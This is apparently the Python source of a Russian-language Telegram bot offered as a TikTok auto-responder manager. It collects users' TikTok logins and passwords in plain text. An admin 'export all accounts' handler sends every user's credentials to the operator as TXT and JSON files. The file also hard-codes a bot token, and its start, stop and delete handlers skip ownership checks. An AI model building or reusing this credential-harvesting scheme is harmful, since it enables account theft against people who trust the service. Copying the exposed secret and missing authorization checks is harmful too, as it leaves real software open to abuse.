import asyncio
import logging
import json
import io
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ВАШИ ДАННЫЕ
BOT_TOKEN = "8340737319:AAGyz2fGHgiSzZWwuE0xioUL5at24Rzt8kI"
ADMIN_ID = 8478884644

from database import init_db, add_account, get_accounts_by_user, get_all_accounts, get_account_by_id, delete_account
from tiktok_worker import TikTokWorker

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

# Инициализация бота
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# Активные воркеры
active_workers = {}

# Состояния
class AddAccountState(StatesGroup):
    waiting_for_username = State()
    waiting_for_password = State()

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

# ========== КЛАВИАТУРЫ ==========

def get_main_keyboard(is_admin_user: bool = False):
    buttons = [
        [InlineKeyboardButton(text="➕ Добавить аккаунт", callback_data="add_account")],
        [InlineKeyboardButton(text="📱 Мои аккаунты", callback_data="my_accounts")],
        [InlineKeyboardButton(text="🚀 Запустить автоответчик", callback_data="start_worker")],
        [InlineKeyboardButton(text="⏹ Остановить автоответчик", callback_data="stop_worker")],
        [InlineKeyboardButton(text="📊 Статус работы", callback_data="status")],
        [InlineKeyboardButton(text="❓ Помощь", callback_data="help")]
    ]
    if is_admin_user:
        buttons.append([InlineKeyboardButton(text="🔐 Админ-панель", callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_admin_keyboard():
    buttons = [
        [InlineKeyboardButton(text="📊 Общая статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="👥 Список пользователей", callback_data="admin_users")],
        [InlineKeyboardButton(text="📥 Получить все аккаунты", callback_data="admin_export")],
        [InlineKeyboardButton(text="🛑 Остановить всё", callback_data="admin_stop_all")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_accounts_keyboard(accounts):
    buttons = []
    for acc in accounts:
        status = "✅" if acc['id'] in active_workers else "❌"
        buttons.append([InlineKeyboardButton(
            text=f"{status} ID {acc['id']}: {acc['username']}",
            callback_data=f"account_{acc['id']}"
        )])
    buttons.append([InlineKeyboardButton(text="➕ Добавить новый", callback_data="add_account")])
    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_account_actions_keyboard(account_id, username, is_running):
    buttons = []
    if is_running:
        buttons.append([InlineKeyboardButton(text="⏹ Остановить", callback_data=f"stop_{account_id}")])
    else:
        buttons.append([InlineKeyboardButton(text="🚀 Запустить", callback_data=f"start_{account_id}")])
        buttons.append([InlineKeyboardButton(text="🔍 Проверить вход", callback_data=f"test_{account_id}")])
    buttons.append([InlineKeyboardButton(text="🗑 Удалить", callback_data=f"delete_{account_id}")])
    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="my_accounts")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ========== КОМАНДЫ ==========

@dp.message(Command("start"))
async def start_cmd(message: Message):
    is_admin_user = is_admin(message.from_user.id)
    await message.answer(
        "🤖 TikTok Bot Manager\n\n✅ Бот работает!\n\nИспользуйте кнопки ниже:",
        reply_markup=get_main_keyboard(is_admin_user)
    )

@dp.message(Command("cancel"))
async def cancel_cmd(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("✅ Отменено", reply_markup=get_main_keyboard(is_admin(message.from_user.id)))

# ========== ОБРАБОТКА КНОПОК ==========

@dp.callback_query()
async def handle_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    is_admin_user = is_admin(user_id)
    data = callback.data
    
    # Навигация
    if data == "back_to_main":
        await callback.message.edit_text(
            "🤖 TikTok Bot Manager\n\nГлавное меню:",
            reply_markup=get_main_keyboard(is_admin_user)
        )
        await callback.answer()
        return
    
    if data == "help":
        await callback.message.edit_text(
            "📚 Помощь\n\nИспользуйте кнопки для управления ботом.\n\n"
            "📌 Функции:\n"
            "• Добавление аккаунтов TikTok\n"
            "• Автоматический ответ на сообщения\n"
            "• Отправка стикеров раз в 11 часов\n"
            "• Поддержание активности в диалогах",
            reply_markup=get_back_keyboard()
        )
        await callback.answer()
        return
    
    if data == "add_account":
        await state.set_state(AddAccountState.waiting_for_username)
        await callback.message.edit_text(
            "📱 Введите логин или email TikTok:\n\nДля отмены /cancel",
            reply_markup=get_back_keyboard()
        )
        await callback.answer()
        return
    
    if data == "my_accounts":
        accounts = await get_accounts_by_user(user_id)
        if not accounts:
            await callback.message.edit_text(
                "📭 У вас нет аккаунтов.\n\nНажмите ➕ Добавить аккаунт",
                reply_markup=get_back_keyboard()
            )
        else:
            text = "📱 Ваши аккаунты:\n\n"
            for acc in accounts:
                status = "🟢" if acc['active'] else "⚪️"
                is_running = "🚀" if acc['id'] in active_workers else "⏸"
                text += f"{status}{is_running} ID {acc['id']}: {acc['username']}\n"
            await callback.message.edit_text(text, reply_markup=get_accounts_keyboard(accounts))
        await callback.answer()
        return
    
    if data == "status":
        accounts = await get_accounts_by_user(user_id)
        if not accounts:
            await callback.message.edit_text("📭 Нет аккаунтов", reply_markup=get_back_keyboard())
        else:
            text = "📊 Статус работы:\n\n"
            for acc in accounts:
                is_active = acc['id'] in active_workers
                status = "🟢 РАБОТАЕТ" if is_active else "⚪️ ОСТАНОВЛЕН"
                text += f"ID {acc['id']}: {acc['username']}\n└ {status}\n\n"
            await callback.message.edit_text(text, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    if data == "start_worker":
        accounts = await get_accounts_by_user(user_id)
        buttons = []
        for acc in accounts:
            if acc['id'] not in active_workers:
                buttons.append([InlineKeyboardButton(
                    text=f"▶️ ID {acc['id']}: {acc['username']}",
                    callback_data=f"start_{acc['id']}"
                )])
        if not buttons:
            await callback.message.edit_text("✅ Все автоответчики уже работают", reply_markup=get_back_keyboard())
        else:
            buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")])
            await callback.message.edit_text(
                "🚀 Выберите аккаунт для запуска:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
            )
        await callback.answer()
        return
    
    if data == "stop_worker":
        accounts = await get_accounts_by_user(user_id)
        buttons = []
        for acc in accounts:
            if acc['id'] in active_workers:
                buttons.append([InlineKeyboardButton(
                    text=f"⏸ ID {acc['id']}: {acc['username']}",
                    callback_data=f"stop_{acc['id']}"
                )])
        if not buttons:
            await callback.message.edit_text("❌ Нет работающих автоответчиков", reply_markup=get_back_keyboard())
        else:
            buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")])
            await callback.message.edit_text(
                "⏹ Выберите аккаунт для остановки:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
            )
        await callback.answer()
        return
    
    # ========== АДМИН-ПАНЕЛЬ ==========
    
    if data == "admin_panel" and is_admin_user:
        await callback.message.edit_text("🔐 Админ-панель\n\nВыберите действие:", reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    if data == "admin_stats" and is_admin_user:
        accounts = await get_all_accounts()
        total = len(accounts)
        running = sum(1 for acc in accounts if acc['id'] in active_workers)
        users = len(set(acc['telegram_id'] for acc in accounts))
        text = f"📊 Общая статистика:\n\n👥 Пользователей: {users}\n📱 Всего аккаунтов: {total}\n🚀 Работает сейчас: {running}"
        await callback.message.edit_text(text, reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    if data == "admin_users" and is_admin_user:
        accounts = await get_all_accounts()
        users = {}
        for acc in accounts:
            if acc['telegram_id'] not in users:
                users[acc['telegram_id']] = []
            users[acc['telegram_id']].append(acc)
        text = "👥 Список пользователей:\n\n"
        for uid, accs in users.items():
            text += f"👤 ID {uid}: {len(accs)} аккаунтов\n"
            for acc in accs:
                running = "🚀" if acc['id'] in active_workers else "⏸"
                text += f"   └ {running} ID {acc['id']}: {acc['username']}\n"
            text += "\n"
        await callback.message.edit_text(text, reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    # ========== НОВАЯ ФУНКЦИЯ: ЭКСПОРТ ВСЕХ АККАУНТОВ ==========
    
    if data == "admin_export" and is_admin_user:
        await callback.message.edit_text("📥 Формирую файл с данными аккаунтов...", reply_markup=get_admin_keyboard())
        
        accounts = await get_all_accounts()
        
        if not accounts:
            await callback.message.edit_text("📭 Нет аккаунтов для экспорта", reply_markup=get_admin_keyboard())
            await callback.answer()
            return
        
        # Формируем данные для экспорта
        export_data = []
        for acc in accounts:
            export_data.append({
                "id": acc['id'],
                "telegram_id": acc['telegram_id'],
                "username": acc['username'],
                "password": await get_password_by_id(acc['id']),
                "active": acc['active'],
                "created_at": acc['created_at'],
                "is_running": acc['id'] in active_workers
            })
        
        # Создаем TXT файл
        txt_content = "=" * 60 + "\n"
        txt_content += "TIKTOK BOT - ЭКСПОРТ АККАУНТОВ\n"
        txt_content += f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        txt_content += f"Всего аккаунтов: {len(accounts)}\n"
        txt_content += "=" * 60 + "\n\n"
        
        for acc in export_data:
            txt_content += f"📱 АККАУНТ ID: {acc['id']}\n"
            txt_content += f"├─ Владелец (Telegram ID): {acc['telegram_id']}\n"
            txt_content += f"├─ Логин: {acc['username']}\n"
            txt_content += f"├─ Пароль: {acc['password']}\n"
            txt_content += f"├─ Статус: {'Активен' if acc['active'] else 'Неактивен'}\n"
            txt_content += f"├─ Работает: {'Да' if acc['is_running'] else 'Нет'}\n"
            txt_content += f"└─ Добавлен: {acc['created_at']}\n\n"
        
        txt_content += "=" * 60 + "\n"
        txt_content += "КОНЕЦ ФАЙЛА\n"
        
        # Создаем JSON файл
        json_content = json.dumps(export_data, ensure_ascii=False, indent=2, default=str)
        
        # Отправляем TXT файл
        txt_file = io.BytesIO(txt_content.encode('utf-8'))
        txt_file.name = f"accounts_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        # Отправляем JSON файл
        json_file = io.BytesIO(json_content.encode('utf-8'))
        json_file.name = f"accounts_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        await callback.message.delete()
        
        # Отправляем файлы
        await callback.message.answer_document(
            types.BufferedInputFile(txt_file.getvalue(), filename=txt_file.name),
            caption=f"📥 Экспорт аккаунтов\nДата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nВсего: {len(accounts)} аккаунтов"
        )
        
        await callback.message.answer_document(
            types.BufferedInputFile(json_file.getvalue(), filename=json_file.name),
            caption="📄 JSON формат для разработчиков"
        )
        
        await callback.message.answer(
            "✅ Экспорт завершен!",
            reply_markup=get_admin_keyboard()
        )
        await callback.answer("✅ Файлы отправлены!")
        return
    
    if data == "admin_stop_all" and is_admin_user:
        count = len(active_workers)
        for aid, worker in list(active_workers.items()):
            await worker.stop()
            del active_workers[aid]
        await callback.message.edit_text(f"✅ Остановлено {count} автоответчиков", reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    # Действия с аккаунтом
    if data.startswith("account_"):
        account_id = int(data.split("_")[1])
        account = await get_account_by_id(account_id)
        if account and (account['telegram_id'] == user_id or is_admin_user):
            is_running = account_id in active_workers
            text = f"🔐 Аккаунт ID {account_id}\n\n📱 Логин: {account['username']}\n🚀 Статус: {'🟢 Работает' if is_running else '⚪️ Остановлен'}"
            await callback.message.edit_text(text, reply_markup=get_account_actions_keyboard(account_id, account['username'], is_running))
        await callback.answer()
        return
    
    if data.startswith("start_"):
        account_id = int(data.split("_")[1])
        account = await get_account_by_id(account_id)
        if account and account_id not in active_workers:
            worker = TikTokWorker(account_id, account['username'], account['password'])
            await worker.start()
            active_workers[account_id] = worker
            await callback.message.edit_text(
                f"✅ Автоответчик запущен!\n\n📱 Аккаунт: {account['username']}\n🆔 ID: {account_id}",
                reply_markup=get_back_keyboard()
            )
            await callback.answer("✅ Запущено!", show_alert=True)
        else:
            await callback.answer("❌ Ошибка запуска", show_alert=True)
        return
    
    if data.startswith("stop_"):
        account_id = int(data.split("_")[1])
        if account_id in active_workers:
            await active_workers[account_id].stop()
            del active_workers[account_id]
            await callback.message.edit_text(f"✅ Автоответчик для ID {account_id} остановлен", reply_markup=get_back_keyboard())
            await callback.answer("✅ Остановлено!", show_alert=True)
        else:
            await callback.answer("❌ Автоответчик не работает", show_alert=True)
        return
    
    if data.startswith("delete_"):
        account_id = int(data.split("_")[1])
        if account_id in active_workers:
            await active_workers[account_id].stop()
            del active_workers[account_id]
        await delete_account(account_id)
        await callback.message.edit_text("🗑 Аккаунт удален", reply_markup=get_back_keyboard())
        await callback.answer("✅ Удалено!", show_alert=True)
        return
    
    if data.startswith("test_"):
        account_id = int(data.split("_")[1])
        await callback.message.edit_text("🔄 Проверка входа...", reply_markup=get_back_keyboard())
        await callback.answer("🔍 Проверка...")
        return
    
    await callback.answer("❓ Неизвестная команда")

# ========== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ==========

async def get_password_by_id(account_id: int) -> str:
    """Получить пароль аккаунта по ID"""
    account = await get_account_by_id(account_id)
    if account:
        return account['password']
    return "Не найден"

# ========== ДОБАВЛЕНИЕ АККАУНТА ==========

@dp.message(AddAccountState.waiting_for_username)
async def add_username(message: Message, state: FSMContext):
    username = message.text.strip()
    if not username:
        await message.answer("❌ Логин не может быть пустым")
        return
    await state.update_data(username=username)
    await state.set_state(AddAccountState.waiting_for_password)
    await message.answer("🔐 Введите пароль:", reply_markup=get_back_keyboard())

@dp.message(AddAccountState.waiting_for_password)
async def add_password(message: Message, state: FSMContext):
    password = message.text.strip()
    if not password:
        await message.answer("❌ Пароль не может быть пустым")
        return
    
    data = await state.get_data()
    username = data['username']
    
    try:
        account_id = await add_account(message.from_user.id, username, password)
        await message.answer(
            f"✅ Аккаунт добавлен!\n\n📱 Логин: {username}\n🆔 ID: {account_id}",
            reply_markup=get_main_keyboard(is_admin(message.from_user.id))
        )
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}", reply_markup=get_main_keyboard(is_admin(message.from_user.id)))
    
    await state.clear()

# ========== ЗАПУСК ==========

async def main():
    await init_db()
    logger.info("✅ База данных инициализирована")
    logger.info("🚀 Бот запущен и готов к работе!")
    
    me = await bot.get_me()
    logger.info(f"🤖 Бот: @{me.username}")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
